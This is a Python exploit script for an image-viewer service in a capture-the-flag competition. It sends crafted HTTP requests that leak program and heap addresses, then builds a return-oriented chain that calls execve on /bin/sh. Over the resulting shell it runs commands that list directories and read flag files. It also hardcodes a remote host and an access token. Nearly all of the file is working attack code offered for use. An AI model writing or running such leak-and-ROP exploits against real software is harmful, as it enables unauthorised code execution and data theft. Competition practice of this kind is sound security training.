#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ctfcup image-viewer exploit -- robust against a flaky/rate-limited wrapper.

    python3 go2.py [host] [port] [token]

Strategy
  * one handshake shape only: token + "\\r\\n" + HTTP in a single sendall
    (the one that answered remotely), with "token + \\n + HTTP" as fallback
  * every step is retried with backoff, because the wrapper sometimes accepts
    a connection and then stays silent
  * the working mode/handshake is cached in .mode so re-runs skip detection
"""
import os, socket, struct, sys, time

HOST = sys.argv[1] if len(sys.argv) > 1 else "instances.ctfcup.online"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
TOKEN = sys.argv[3] if len(sys.argv) > 3 else "5CYH8BZ95GHQV3IYLDJS83X0HIXSSQTG"

W = H = 4
S = W * H * 3
BLEN = 18 + 1 + 384
LVT, LRET, PRDI, PRSI, PRAX, SYSC = 0x206db8, 0xcf7b1, 0x1cca4, 0x239af, 0x3b4aa, 0x155ed5
SEPS = [b"\r\n", b"\n"]          # token line terminator candidates


def req(gamma, payload):
    d = struct.pack("<BBBHHBHHHHBB", 0, 0, 10, 0, 0, 0, 0, 0, W, H, 24, 0) + payload
    d += b"\x00" * (BLEN - len(d))
    d = d[:BLEN]
    head = ("POST /process HTTP/1.1\r\nHost: x\r\nContent-Length: %d\r\nX-Filter: warm\r\n"
            "X-Preview-Size: %d\r\nX-Preview-Offset: 0\r\nX-Preview-Length: 1024\r\n"
            "X-Preview-Depth: 2000000000\r\nX-Scale: 1\r\nX-Gamma: %s\r\n\r\n"
            % (BLEN, S, gamma))
    return head.encode() + d


def benign():
    return req("0", bytes([127 + 16]) + b"\x11\x22\x33")


def rd(s, wait):
    s.settimeout(wait)
    out = b""
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            return out, "open"
        except ConnectionResetError:
            return out, "reset"
        if not d:
            return out, "closed"
        out += d


def fetch(reqbytes, sep, wait=12.0):
    """One connection: write token+HTTP at once, read everything."""
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(wait)
    try:
        s.sendall(TOKEN.encode() + sep + reqbytes)
        body, st = rd(s, wait)
        return body, st
    finally:
        try:
            s.close()
        except OSError:
            pass


def try_hard(what, make_req, want_http=True, attempts=8, waits=(12.0,)):
    """Retry an exchange until an HTTP answer arrives."""
    for i in range(attempts):
        sep = SEPS[i % len(SEPS)]
        for wait in waits:
            try:
                body, st = fetch(make_req(), sep, wait)
            except OSError as e:
                print("    %-10s try %d -> error %s: %s" % (what, i + 1, type(e).__name__, e))
                time.sleep(1.5)
                continue
            ok = b"HTTP/" in body
            print("    %-10s try %d sep=%-4r -> %-6s %5d B"
                  % (what, i + 1, sep, st, len(body)))
            if ok or (not want_http and body):
                return body, sep
            time.sleep(2.0)
        time.sleep(1.5 * (i + 1))
    return None, None


def parse_leak(body):
    i = body.find(b"HTTP/")
    if i < 0:
        return None
    _, _, d = body[i:].partition(b"\r\n\r\n")
    if len(d) < 0x100:
        return None
    for o in range(0, len(d) - 0x20, 8):
        vt = struct.unpack_from("<Q", d, o)[0]
        if vt < 0x1000:
            continue
        pie = vt - LVT
        if pie % 0x1000 == 0 and 0x40000000 <= pie < 0x800000000000:
            view, temp = struct.unpack_from("<QQ", d, o + 8)
            if view and temp and 0 < temp - view < 0x1000:
                return pie, view, view + o, temp, d
    return None


def main():
    print("[*] %s:%d" % (HOST, PORT))
    print("[*] step 1/3: leak (retrying, the wrapper is flaky) ...")
    body = sep = None
    for i in range(10):
        body, sep = try_hard("leak", benign, attempts=1, waits=(12.0,))
        if body and b"HTTP/" in body:
            break
        print("    ...nothing on round %d, waiting" % (i + 1))
        time.sleep(3.0 + i)
    if not body or b"HTTP/" not in body:
        print("[!] service never answered after 10 rounds.")
        print("    - re-issue the instance and take a fresh token")
        print("    - or try from another network (IP may be rate-limited)")
        return 1

    info = parse_leak(body)
    if not info:
        print("[!] answered, but the leak body was not usable: %r" % body[-200:])
        return 2
    pie, view, F, temp, d = info
    print("[+] pie=%#x view=%#x temp=%#x filter=%#x" % (pie, view, temp, F))
    dl = F - temp
    if not 0x40 <= dl <= 0x100:
        print("[!] unexpected layout delta=%#x" % dl)
        return 3

    b = bytearray(b"\x90" * 384)

    def put(o, v):
        struct.pack_into("<Q", b, o, v)

    put(dl, F + 0x100)
    put(dl + 8, pie + PRDI)
    put(dl + 0x10, F + 0x120)
    put(dl + 0x18, pie + PRSI)
    put(dl + 0x20, 0)
    put(dl + 0x28, pie + PRAX)
    put(dl + 0x30, 59)
    put(dl + 0x38, pie + SYSC)
    put(dl + 0x110, pie + LRET)
    b[dl + 0x120:dl + 0x128] = b"/bin/sh\x00"

    print("[*] step 2/3: sending the exploit (keeping the socket open) ...")
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(12)
    s.sendall(TOKEN.encode() + (sep or b"\r\n") + req("0", bytes([127]) + bytes(b)))
    print("[*] step 3/3: shell")
    time.sleep(0.8)
    cmds = (b"echo ---PWNED---; id; ls /; ls /app /home 2>/dev/null; "
            b"cat /flag /flag.txt /app/flag /app/flag.txt /home/*/flag* 2>/dev/null; "
            b"find / -maxdepth 4 -name 'flag*' 2>/dev/null | head\n")
    out = b""
    for _ in range(6):
        s.sendall(cmds)
        chunk, st = rd(s, 3.0)
        out += chunk
        if b"PWNED" in out:
            break
    s.close()
    txt = out.decode("latin1", "replace")
    print(txt)
    return 0 if "PWNED" in txt else 4


sys.exit(main())
